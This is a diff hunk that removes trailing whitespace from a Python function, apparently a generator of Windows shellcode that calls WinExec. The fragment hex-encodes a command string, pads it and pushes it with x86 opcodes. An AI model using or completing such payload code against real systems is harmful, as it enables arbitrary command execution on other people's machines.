@@ -12,15 +12,15 @@ def WinExec( command):
 	fill += "c6f8b7a1c01c78b7caffc01c789d9b1ff53e2fd"
 	if len(command) == 4:
 		stack = "%s" % (codecs.encode(command, 'hex'))
-		data = findall("..?", stack)				
-		fill += "68"+"".join(data)				
-	else:											
-		if len(command)%4 == 3:										
-			padd = "\x20"							
-		elif len(command)%4 == 2:				
-			padd = "\x20"*2							
-		elif len(command)%4 == 1:					
-			padd = "\x20"*3							
+		data = findall("..?", stack)
+		fill += "68"+"".join(data)
+	else:
+		if len(command)%4 == 3:
+			padd = "\x20"
+		elif len(command)%4 == 2:
+			padd = "\x20"*2
+		elif len(command)%4 == 1:
+			padd = "\x20"*3
 		else:
 			padd = ""
 		command = command + padd
